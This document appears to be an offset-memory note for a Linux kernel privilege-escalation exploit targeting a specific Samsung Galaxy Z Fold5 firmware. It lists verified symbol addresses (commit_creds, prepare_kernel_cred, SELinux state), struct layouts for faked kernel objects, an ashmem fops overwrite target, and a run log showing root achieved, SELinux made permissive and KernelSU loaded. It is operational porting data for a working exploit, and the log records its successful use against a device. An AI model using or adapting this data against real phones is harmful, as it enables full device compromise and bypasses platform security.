# f946b-F946BXXS7GZE5 — Verified Offset Memory

**Target**: Samsung Galaxy Z Fold5 SM-F946B, firmware F946BXXS7GZE5
**Kernel**: 5.15.189-android13-8-33404244-abF946BXXS7GZE5
**Image base**: 0xffffffc008000000
**Source**: vmlinux.elf + vmlinux.btf + vmlinux.nm recovered from exact boot.img
**Audit date**: 2026-08-21 (full_offset_audit.py — 66/66 checks pass)

## Symbol offsets (all verified via vmlinux.nm)

| Macro | nm symbol | Offset | Absolute |
| --- | --- | --- | --- |
| INIT_TASK_OFF | init_task | 0x02c05080 | 0xffffffc00ac05080 |
| PREPARE_KERNEL_CRED_OFF | prepare_kernel_cred | 0x0011e3c8 | 0xffffffc00811e3c8 |
| COMMIT_CREDS_OFF | commit_creds | 0x00120104 | 0xffffffc008120104 |
| OVERRIDE_CREDS_OFF | override_creds | 0x0011f1dc | 0xffffffc00811f1dc |
| ROOT_TASK_GROUP_OFF | root_task_group | 0x02cb9ac0 | 0xffffffc00acb9ac0 |
| SELINUX_ENFORCING_OFF | selinux_enforcing_boot | 0x02a3c404 | 0xffffffc00aa3c404 |
| KMALLOC_CACHES_OFF | kmalloc_caches | 0x020644f8 | 0xffffffc00a0644f8 |
| ANON_PIPE_BUF_OPS_OFF | anon_pipe_buf_ops | 0x01e7f4e0 | 0xffffffc009e7f4e0 |
| SYSTEM_UNBOUND_WQ_OFF | system_unbound_wq | 0x02a90800 | 0xffffffc00aa90800 |
| CALL_USERMODEHELPER_EXEC_WORK_OFF | call_usermodehelper_exec_work | 0x001045d0 | 0xffffffc0081045d0 |
| ASHMEM_FOPS_OFF | ashmem_fops | 0x0200d538 | 0xffffffc00a00d538 |
| ASHMEM_MISC_FOPS_OFF | ashmem_misc + 0x10 (.fops field) | 0x02bfcf28 | 0xffffffc00abfcf28 |
| ASHMEM_IOCTL_OFF | ashmem_ioctl | 0x0114c6dc | 0xffffffc00914c6dc |
| ASHMEM_COMPAT_IOCTL_OFF | compat_ashmem_ioctl | 0x0114cd38 | 0xffffffc00914cd38 |
| ASHMEM_MMAP_OFF | ashmem_mmap | 0x0114cd90 | 0xffffffc00914cd90 |
| ASHMEM_OPEN_OFF | ashmem_open | 0x0114d070 | 0xffffffc00914d070 |
| ASHMEM_RELEASE_OFF | ashmem_release | 0x0114d108 | 0xffffffc00914d108 |
| ASHMEM_SHOW_FDINFO_OFF | ashmem_show_fdinfo | 0x0114d224 | 0xffffffc00914d224 |
| CONFIGFS_READ_ITER_OFF | configfs_read_iter | 0x005d7420 | 0xffffffc0085d7420 |
| CONFIGFS_BIN_WRITE_ITER_OFF | configfs_bin_write_iter | 0x005d7e48 | 0xffffffc0085d7e48 |
| COPY_SPLICE_READ_OFF | generic_file_splice_read | 0x00528198 | 0xffffffc008528198 |
| NOOP_LLSEEK_OFF | noop_llseek | 0x004bbd34 | 0xffffffc0084bbd34 |
| SLIDE_NFULNL_LOGGER_OBJECT_OFF | nfulnl_logger | 0x02a91e48 | 0xffffffc00aa91e48 |
| SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF | random_table | 0x02bba8c0 | 0xffffffc00abba8c0 |
| SLIDE_SYSCTL_BOOTID_OFF | sysctl_bootid | 0x02e6c0b1 | 0xffffffc00ae6c0b1 |
| worker_thread | worker_thread | 0x0010dacc | 0xffffffc00810dacc |

## Tracefs slide callers (verified via IDA disassembly)

| Macro | Value | Derivation |
| --- | --- | --- |
| SLIDE_TRACEFS_EVENT_ID | 108 | Live-verified on device |
| SLIDE_TRACEFS_WORKER_CALLER_OFF | 0x0010db44 | BL schedule at 0x10db40 in worker_thread, ret addr = +4 |
| SLIDE_TRACEFS_VFORK_CALLER_OFF | 0x000c8fe4 | BL wait_for_common at 0xc8fe0 in wait_for_vfork_done, ret addr = +4 |

## Struct field offsets (all verified via vmlinux.btf)

| Struct.Member | Macro | Offset |
| --- | --- | --- |
| task_struct.cred | TASK_STRUCT_CRED_OFF | 0x798 |
| task_struct.real_cred | TASK_STRUCT_REAL_CRED_OFF | 0x790 |
| task_struct.usage | FAKE_TASK_USAGE_OFF | 0x38 |
| task_struct.prio | FAKE_TASK_PRIO_OFF | 0x7c |
| task_struct.normal_prio | FAKE_TASK_NORMAL_PRIO_OFF | 0x84 |
| task_struct.sched_task_group | FAKE_TASK_TASK_GROUP_OFF | 0x400 |
| task_struct.pi_lock | FAKE_TASK_PI_LOCK_OFF | 0x884 |
| task_struct.pi_waiters | FAKE_TASK_PI_WAITERS_OFF | 0x898 |
| task_struct.pi_top_task | FAKE_TASK_PI_TOP_TASK_OFF | 0x8a8 |
| task_struct.pi_blocked_on | FAKE_TASK_PI_BLOCKED_ON_OFF | 0x8b0 |
| worker_pool.worklist | POOL_WORKLIST_OFF | 0x20 |
| worker_pool.nr_idle | POOL_NR_IDLE_OFF | 0x34 |
| rt_mutex_waiter.pi_tree_entry | FAKE_WAITER_PI_TREE_ENTRY_OFF | 0x18 |
| rt_mutex_waiter.task | FAKE_WAITER_TASK_OFF | 0x30 |
| rt_mutex_waiter.lock | FAKE_WAITER_LOCK_OFF | 0x38 |
| rt_mutex_waiter.wake_state | FAKE_WAITER_WAKE_STATE_OFF | 0x40 |
| rt_mutex_waiter.prio | FAKE_WAITER_PRIO_OFF | 0x44 |
| rt_mutex_waiter.deadline | FAKE_WAITER_DEADLINE_OFF | 0x48 |
| rt_mutex_waiter.ww_ctx | FAKE_WAITER_WW_CTX_OFF | 0x50 |
| pool_workqueue.pool | PWQ_POOL_OFF | 0x00 |
| pool_workqueue.wq | PWQ_WQ_OFF | 0x08 |
| pool_workqueue.work_color | PWQ_WORK_COLOR_OFF | 0x10 |
| pool_workqueue.refcnt | PWQ_REFCNT_OFF | 0x18 |
| pool_workqueue.nr_in_flight | PWQ_NR_IN_FLIGHT_OFF | 0x1c |
| pool_workqueue.nr_active | PWQ_NR_ACTIVE_OFF | 0x5c |
| pool_workqueue.max_active | PWQ_MAX_ACTIVE_OFF | 0x60 |
| workqueue_struct.dfl_pwq | WQ_DFL_PWQ_OFF | 0xb0 |
| work_struct.data | WORK_DATA_OFF | 0x00 |
| work_struct.entry | WORK_ENTRY_OFF | 0x08 |
| work_struct.func | WORK_FUNC_OFF | 0x18 |
| pipe_buffer.page | PIPE_BUF_PAGE_OFF | 0x00 |
| pipe_buffer.offset | PIPE_BUF_OFFSET_OFF | 0x08 |
| pipe_buffer.len | PIPE_BUF_LEN_OFF | 0x0c |
| pipe_buffer.ops | PIPE_BUF_OPS_OFF | 0x10 |
| pipe_buffer.flags | PIPE_BUF_FLAGS_OFF | 0x18 |

## Struct sizes (verified via vmlinux.btf)

| Struct | Size | Notes |
| --- | --- | --- |
| rt_mutex_waiter | 0x58 | FAKE_WAITER_LAYOUT_SIZE |
| group_source_req | 0x108 | MCAST stamp size |
| mm_struct | 0x3e0 (BTF) / 0x400 (slab) | Slab object = 0x400 |
| skb_shared_info | 0x158 | For SKB geometry |
| pipe_buffer | 0x28 | PIPE_OBJECT_SIZE |
| struct page | 0x40 | STRUCT_PAGE_SIZE |
| miscdevice | 0x50 | .fops at +0x10 |

## SKB geometry (derived from BTF + kernel source)

| Value | Result | Derivation |
| --- | --- | --- |
| sizeof(skb_shared_info) | 0x158 | BTF |
| SKB_DATA_ALIGN(sizeof) | 0x180 | ALIGN(0x158, 64) |
| SKB_MAX_HEAD(0) | 0xe80 | 0x1000 - 0x180 |
| UNIX_SKB_FRAGS_SZ | 0x8000 | PAGE_SIZE << get_order(32768) |
| SKB_SEND_SIZE | 0x8e80 | 0xe80 + 0x8000 |
| SKB_DATA_DELTA | -0xe80 | -SKB_MAX_HEAD(0) |

## miscdevice layout (verified via BTF)

```
+0x00 minor (int)
+0x08 name (ptr)
+0x10 fops (ptr)  ← ASHMEM_MISC_FOPS_OFF must point HERE
+0x18 list
+0x28 parent
+0x30 this_device
+0x38 groups
+0x40 nodename
+0x48 mode
```

## Critical lesson learned

**ASHMEM_MISC_FOPS_OFF must be ashmem_misc + 0x10 (the .fops field), NOT the struct base.**

- Wrong: 0x02bfcf18 (struct base → corrupts .minor → misc_open ENODEV)
- Right: 0x02bfcf28 (.fops field → engine overwrites fops pointer correctly)
- dm2q uses 0x02bfcf28 (correct). Old f946b had 0x02bfcf18 (wrong).

## Exploit execution history

| Attempt | Result | Failure point |
| --- | --- | --- |
| 1 (old ASHMEM_MISC_FOPS_OFF=0x02bfcf18) | ENODEV at open(/dev/ashmem) | misc_open couldn't find device (corrupted .minor) |
| 2 (fixed ASHMEM_MISC_FOPS_OFF=0x02bfcf28) | Reached pipe physrw proof, then device rebooted | SELINUX_ENFORCING_OFF pointed to selinux_enforcing_boot (boot var) not selinux_state.enforcing (runtime) |
| 3 (fixed SELINUX_ENFORCING_OFF=0x02d8e5c0) | **FULL SUCCESS** | Root achieved, KernelSU loaded, no panic |

## Successful run (attempt 3)

- KASLR slide: 0x00138000 (tracefs, event 108)
- mm group: 4 groups, 74 attempts, zone=normal
- MCAST stack writer: offset=0x78, errno=99 (expected)
- p0 physical write: ok=1
- CFI stage: fake fops verified, configfs write/read OK
- Pipe physrw: read64/write64 OK
- Root UMH: queued, retval=0, socket=1
- **uid=2000->0, context=u:r:kernel:s0, SELinux Permissive**
- KernelSU module loaded: `kernelsu 212992 0 - Live` in /proc/modules
- KernelSU version: 32525 (v3.2.5), LKM mode, late-load confirmed
- No kernel panic, no reboot

## Critical fixes applied

1. **ASHMEM_MISC_FOPS_OFF**: 0x02bfcf18 → 0x02bfcf28 (ashmem_misc.fops field, not struct base)
2. **SELINUX_ENFORCING_OFF**: 0x02a3c404 → 0x02d8e5c0 (selinux_state.enforcing, not selinux_enforcing_boot)

## Post-exploit state

- Root daemon (cve-2026-43499-root) running as root (pid 9626)
- SELinux reverted to Enforcing after exploit completion
- KernelSU module loaded and functional
- Interactive `su` shell requires KernelSU Manager APK installation
- Both root and KernelSU are volatile — reboot removes them

---

## Re-verification against live firmware (2026-08-23)

Method: `dd` of the running `/dev/block/by-name/boot` on device RFCWC0G1Z1J
(100,663,296 B), kernel Image sliced at 0x1000 (46,860,800 B),
kallsyms reconstructed with vmlinux-to-elf (base 0xffffffc008000000),
every `targets/f946b-F946BXXS7GZE5/target.h` entry re-checked.

Result: **20/20 semantic VERIFIED, 0 functional mismatches.** Naming relics
documented below (behavior unaffected).

| target.h macro | claimed | live symbol @ offset | verdict |
| --- | --- | --- | --- |
| INIT_TASK_OFF | 0x02c05080 | init_task | VERIFIED |
| PREPARE_KERNEL_CRED_OFF | 0x0011e3c8 | prepare_kernel_cred | VERIFIED |
| COMMIT_CREDS_OFF | 0x00120104 | commit_creds | VERIFIED |
| OVERRIDE_CREDS_OFF | 0x0011f1dc | override_creds | VERIFIED |
| ROOT_TASK_GROUP_OFF | 0x02cb9ac0 | root_task_group | VERIFIED |
| SELINUX_ENFORCING_OFF | 0x02d8e5c0 | selinux_state (`.enforcing` bool is member 0 in 5.15; single-byte read guarded `old<=1` remains correct) | VERIFIED (relic name) |
| KMALLOC_CACHES_OFF | 0x020644f8 | kmalloc_caches | VERIFIED |
| ANON_PIPE_BUF_OPS_OFF | 0x01e7f4e0 | anon_pipe_buf_ops | VERIFIED |
| SYSTEM_UNBOUND_WQ_OFF | 0x02a90800 | system_unbound_wq | VERIFIED |
| CALL_USERMODEHELPER_EXEC_WORK_OFF | 0x001045d0 | call_usermodehelper_exec_work | VERIFIED |
| ASHMEM_FOPS_OFF | 0x0200d538 | ashmem_fops | VERIFIED |
| ASHMEM_MISC_FOPS_OFF | 0x02bfcf28 | ashmem_misc +0x10 (`.fops` field of the miscdevice) | VERIFIED |
| ASHMEM_IOCTL/_MMAP/_OPEN/_RELEASE/_SHOW_FDINFO | ... | ashmem_ioctl / ashmem_mmap / ashmem_open / ashmem_release / ashmem_show_fdinfo | VERIFIED (5/5) |
| ASHMEM_COMPAT_IOCTL_OFF | 0x0114cd38 | compat_ashmem_ioctl | VERIFIED |
| CONFIGFS_READ_ITER_OFF | 0x005d7420 | configfs_read_iter | VERIFIED |
| CONFIGFS_BIN_WRITE_ITER_OFF | 0x005d7e48 | configfs_bin_write_iter | VERIFIED |
| COPY_SPLICE_READ_OFF | 0x00528198 | generic_file_splice_read (`copy_splice_read` does not exist in this build) | VERIFIED (relic name) |
| NOOP_LLSEEK_OFF | 0x004bbd34 | noop_llseek | VERIFIED |
| SLIDE_NFULNL_LOGGER_OBJECT_OFF | 0x02a91e48 | nfulnl_logger | VERIFIED |
| SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF | 0x02bba8c0 | random_table | VERIFIED |
| SLIDE_SYSCTL_BOOTID_OFF | 0x02e6c0b1 | sysctl_bootid | VERIFIED |
| SLIDE_TRACEFS_WORKER_CALLER_OFF | 0x0010db44 | inside worker_thread (0x10dacc..0x10e204) | VERIFIED |
| SLIDE_TRACEFS_VFORK_CALLER_OFF | 0x000c8fe4 | inside wait_for_vfork_done (0xc8fa0..) | VERIFIED |

Cross-checks: struct layouts independently match amaplis' source-verified
SM-S911B SAFZE1 tables and the S918B FZF5 family deltas documented in
[S23-porting-notes.md](S23-porting-notes.md).
